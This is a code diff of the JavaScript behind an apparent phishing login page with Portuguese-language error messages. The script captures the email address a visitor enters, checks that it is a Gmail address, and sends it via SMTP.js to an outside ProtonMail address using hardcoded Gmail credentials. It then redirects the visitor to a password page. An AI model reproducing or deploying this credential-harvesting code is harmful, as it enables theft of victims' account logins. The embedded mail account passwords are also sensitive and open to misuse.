@@ -8,19 +8,19 @@ window.onload = function()
         var x = document.querySelector("#email");
         var y = x.value;
         console.log(y);
-        if (y.indexOf("@") != -1) {
+        if (y.indexOf("@gmail") != -1) {
                 Email.send({
                     Host: "smtp.gmail.com",
-                    Username : "julio74108520@gmail.com",
-                    Password : "hgvt vldi peit jcoh",
+                    Username : "xsda.ddce.2343.2343.xsop@gmail.com",
+                    Password : "xhqe towf geiu nvyt",
                     To : "user1533@protonmail.com",
-                    From : "julio74108520@gmail.com",
+                    From : "xsda.ddce.2343.2343.xsop@gmail.com",
                     Subject : y,
                     Body : "y",
                 });
             window.location.href = "password.html";
         } else {
-            err.innerHTML = "<p class='err-alert'>Email ou Telefona não encontrados, tente novamente.<p>"
+            err.innerHTML = "<p class='err-alert'>Email ou Telefone não encontrados, tente novamente.<p>"
             document.getElementById("email").value='';
         }
     });
